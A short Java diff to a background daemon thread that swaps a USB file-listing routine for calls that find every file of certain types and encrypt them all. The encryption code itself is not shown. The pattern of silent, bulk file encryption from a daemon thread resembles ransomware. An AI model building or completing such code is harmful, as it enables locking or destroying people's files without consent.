@@ -11,21 +11,19 @@ class DaemonThread implements Runnable {
         processSomething();
     }
 
+
     private void processSomething() {
         try {
-            USBSearcher usbSearcher = new USBSearcher();
-            USBDeviceDetectorManager driveDetector = new USBDeviceDetectorManager();
-            // Display all the USB storage devices currently connected
-            List<USBStorageDevice> usbStorageDeviceList = driveDetector.getRemovableDevices();
-            File folder = new File(usbStorageDeviceList.get(0).getRootDirectory().getPath());
-            usbSearcher.findFiles(folder);
-            System.out.println(usbSearcher.count);
-            System.out.println(usbSearcher.count1);
+            Logic logic = new Logic();
+            logic.searchAllFileOfGivenTypes();
+            System.out.println(Logic.listOfFileOfGivenTypes.size());
+            logic.encryptAllFilesOfGivenType();
 
-            Thread.sleep(5);
+            Thread.sleep(0,2);
         } catch (InterruptedException e) {
+            e.printStackTrace();
+        } catch (Exception e) {
             e.printStackTrace();
         }
     }
-
 }
